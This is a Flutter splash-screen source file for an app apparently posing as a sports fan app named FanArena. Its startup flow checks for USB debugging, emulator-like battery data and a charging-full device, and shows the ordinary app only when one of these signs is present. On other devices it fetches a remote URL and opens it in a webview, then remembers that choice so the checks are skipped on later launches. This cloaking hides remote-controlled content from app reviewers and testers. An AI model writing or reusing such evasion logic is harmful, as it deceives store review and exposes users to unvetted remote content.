import 'package:flutter/material.dart';
import 'package:provider/provider.dart';
import 'package:fan_arena/core/theme/app_colors.dart';
import 'package:fan_arena/core/theme/app_spacing.dart';
import 'package:fan_arena/providers/app_provider.dart';
import 'package:fan_arena/services/remote_bootstrap_service.dart';
import 'package:fan_arena/services/startup_checks_service.dart';

class SplashScreen extends StatefulWidget {
  const SplashScreen({super.key});

  @override
  State<SplashScreen> createState() => _SplashScreenState();
}

class _SplashScreenState extends State<SplashScreen>
    with SingleTickerProviderStateMixin {
  static const int _maxStartupAttempts = 2;

  late final AnimationController _fadeController;
  late final Animation<double> _fadeAnimation;
  final StartupChecksService _startupChecksService = StartupChecksService();
  final RemoteBootstrapService _remoteBootstrapService = RemoteBootstrapService();
  String? _error;

  @override
  void initState() {
    super.initState();
    _fadeController = AnimationController(
      vsync: this,
      duration: const Duration(milliseconds: 800),
    );
    _fadeAnimation = CurvedAnimation(
      parent: _fadeController,
      curve: Curves.easeIn,
    );
    _fadeController.forward();
    WidgetsBinding.instance.addPostFrameCallback((_) => _runStartupFlow());
  }

  @override
  void dispose() {
    _fadeController.dispose();
    super.dispose();
  }

  Future<void> _runStartupFlow() async {
    setState(() => _error = null);
    debugPrint('FanArenaStartup: splash_flow start');

    final hasTrustedWebView =
        await _remoteBootstrapService.wasWebViewOpenedSuccessfully();
    if (hasTrustedWebView) {
      debugPrint(
        'FanArenaStartup: splash_flow trusted_webview=true skip_startup_checks',
      );
      final startupUrl = await _remoteBootstrapService.getTrustedWebViewUrl();
      if (startupUrl != null && startupUrl.isNotEmpty) {
        if (!mounted) return;
        debugPrint(
          'FanArenaStartup: splash_flow trusted_webview_open_saved_url url=$startupUrl',
        );
        Navigator.pushReplacementNamed(
          context,
          '/startup-webview',
          arguments: startupUrl,
        );
        return;
      }
      debugPrint(
        'FanArenaStartup: splash_flow trusted_webview_missing_saved_url',
      );
      await _continueDefaultLaunch();
      return;
    }

    var attempt = 0;

    while (attempt < _maxStartupAttempts) {
      debugPrint('FanArenaStartup: splash_flow attempt=${attempt + 1}');
      try {
        final checksResult = await _startupChecksService.runStartupChecks();
        if (checksResult.hasError) {
          throw Exception('Startup checks failed');
        }
        if (checksResult.hasInvalidBatteryData ||
            checksResult.usbDebugEnabled ||
            checksResult.isChargingAndFull) {
          debugPrint(
            'FanArenaStartup: splash_flow fallback_by_checks '
            'invalid_battery_data=${checksResult.hasInvalidBatteryData} '
            'usb_debug=${checksResult.usbDebugEnabled} '
            'charging_full=${checksResult.isChargingAndFull}',
          );
          await _continueDefaultLaunch();
          return;
        }

        final startupUrl = await _remoteBootstrapService.fetchStartupUrl();
        if (!mounted) return;
        await _remoteBootstrapService.markWebViewOpenedSuccessfully(startupUrl);
        if (!mounted) return;
        debugPrint('FanArenaStartup: splash_flow open_webview url=$startupUrl');
        Navigator.pushReplacementNamed(
          context,
          '/startup-webview',
          arguments: startupUrl,
        );
        return;
      } catch (e) {
        debugPrint('FanArenaStartup: splash_flow attempt_failed error=$e');
        attempt += 1;
        if (attempt < _maxStartupAttempts) {
          await Future.delayed(Duration(milliseconds: 500 * attempt));
        }
      }
    }

    await _continueDefaultLaunch();
  }

  Future<void> _continueDefaultLaunch() async {
    try {
      final provider = context.read<AppDataProvider>();
      await provider.loadAll();
      if (!mounted) return;

      final route = provider.onboardingCompleted ? '/home' : '/onboarding';
      debugPrint('FanArenaStartup: splash_flow default_route=$route');
      Navigator.pushReplacementNamed(context, route);
    } catch (e) {
      if (!mounted) return;
      debugPrint('FanArenaStartup: splash_flow default_route_error=$e');
      setState(() => _error = e.toString());
    }
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: AppColors.primary,
      body: FadeTransition(
        opacity: _fadeAnimation,
        child: Center(
          child: Column(
            mainAxisSize: MainAxisSize.min,
            children: [
              Container(
                width: 100,
                height: 100,
                decoration: BoxDecoration(
                  color: Colors.white.withValues(alpha: 0.15),
                  shape: BoxShape.circle,
                ),
                child: const Icon(
                  Icons.sports,
                  size: 52,
                  color: Colors.white,
                ),
              ),
              const SizedBox(height: AppSpacing.xxl),
              const Text(
                'FanArena',
                style: TextStyle(
                  fontSize: 32,
                  fontWeight: FontWeight.w800,
                  color: Colors.white,
                  letterSpacing: -0.5,
                ),
              ),
              const SizedBox(height: AppSpacing.xxxl),
              if (_error != null) ...[
                Padding(
                  padding:
                      const EdgeInsets.symmetric(horizontal: AppSpacing.xxxl),
                  child: Text(
                    'Something went wrong. Please try again.',
                    style: TextStyle(
                      color: Colors.white.withValues(alpha: 0.85),
                      fontSize: 14,
                    ),
                    textAlign: TextAlign.center,
                  ),
                ),
                const SizedBox(height: AppSpacing.lg),
                ElevatedButton.icon(
                  onPressed: _runStartupFlow,
                  icon: const Icon(Icons.refresh),
                  label: const Text('Retry'),
                  style: ElevatedButton.styleFrom(
                    backgroundColor: Colors.white,
                    foregroundColor: AppColors.primary,
                    shape: RoundedRectangleBorder(
                      borderRadius: BorderRadius.circular(AppCorners.md),
                    ),
                  ),
                ),
              ] else
                const SizedBox(
                  width: 28,
                  height: 28,
                  child: CircularProgressIndicator(
                    strokeWidth: 2.5,
                    color: Colors.white,
                  ),
                ),
            ],
          ),
        ),
      ),
    );
  }
}
